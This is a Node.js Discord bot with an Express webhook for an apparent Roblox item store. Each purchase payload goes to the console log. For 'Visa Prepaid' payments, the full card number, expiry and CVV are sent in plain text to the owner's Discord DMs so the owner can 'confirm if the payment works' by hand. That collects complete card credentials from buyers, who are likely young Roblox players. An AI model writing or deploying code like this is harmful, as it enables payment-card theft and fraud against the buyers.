const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const express = require('express');
const bodyParser = require('body-parser');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ]
});

const app = express();
app.use(bodyParser.json());

const OWNER_ID = '1280339014033080442';   // Your Discord ID

// ====================== YOUR STORE URL HERE ======================
const STORE_URL = 'https://YOUR-STORE-RAILWAY-URL.up.railway.app';   // ← CHANGE THIS!
// =================================================================

client.once('ready', () => {
  console.log(`✅ Bot is online as ${client.user.tag}`);
  // Optional: DM you when bot starts
  client.users.fetch(OWNER_ID).then(user => {
    user.send('**✅ ObsidianX Bot is now online and ready!**').catch(console.error);
  });
});

// Webhook from website
app.post('/purchase-complete', async (req, res) => {
  const payload = req.body || {};
  const { name, username, receipt, paymentType, cardDetails, proof } = payload;

  console.log('📩 New purchase received:', payload);

  const embed = new EmbedBuilder()
    .setColor('#ff4d4d')
    .setTitle('🛒 New Purchase Attempt')
    .setDescription(`**Someone has just looked into buying the ${name || 'Unknown'}**\n\nThey have purchased. Confirm if the payment works.`)
    .addFields(
      { name: 'Receipt', value: receipt || 'N/A', inline: true },
      { name: 'Roblox Username', value: username || 'Unknown', inline: true },
      { name: 'Payment Method', value: paymentType === 'robux' ? 'Robux' : 'Visa Prepaid', inline: true },
      { name: 'Proof', value: proof ? 'Screenshot attached (check console for base64 if needed)' : 'No proof', inline: false }
    )
    .setTimestamp();

  if (paymentType === 'visa' && cardDetails) {
    embed.addFields({ name: 'Card Details', value: `Card: ${cardDetails.cardNumber || 'N/A'}\nExpiry: ${cardDetails.expiry || 'N/A'}\nCVV: ${cardDetails.cvv || 'N/A'}`, inline: false });
  }

  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId(`confirm_${payload.id}`)
      .setLabel('✅ Confirm')
      .setStyle(ButtonStyle.Success),
    new ButtonBuilder()
      .setCustomId(`decline_${payload.id}`)
      .setLabel('❌ Decline')
      .setStyle(ButtonStyle.Danger)
  );

  try {
    const user = await client.users.fetch(OWNER_ID);
    await user.send({ embeds: [embed], components: [row] });
    console.log('✅ DM with buttons sent to owner');
  } catch (e) {
    console.error('❌ Failed to send DM:', e);
  }

  res.json({ success: true });
});

// Button handler
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;

  const [action, itemId] = interaction.customId.split('_');

  if (action === 'confirm') {
    try {
      await fetch(`${STORE_URL}/delete/${itemId}`, { method: 'DELETE' });
      await interaction.update({
        content: `✅ **Purchase confirmed!** Brainrot #${itemId} has been **deleted** from the store.`,
        components: []
      });
      console.log(`✅ Confirmed and deleted item ${itemId}`);
    } catch (e) {
      await interaction.update({ content: '❌ Failed to delete from store.', components: [] });
    }
  } else if (action === 'decline') {
    await interaction.update({
      content: `❌ Purchase declined for item #${itemId}.`,
      components: []
    });
  }
});

// Login
const TOKEN = process.env.DISCORD_TOKEN;
if (!TOKEN) {
  console.error("❌ DISCORD_TOKEN is missing!");
  process.exit(1);
}

client.login(TOKEN).catch(e => {
  console.error("❌ Login failed:", e.message);
  process.exit(1);
});

const PORT = process.env.PORT || 3001;
app.listen(PORT, () => console.log(`🚀 Bot webhook running on port ${PORT}`));
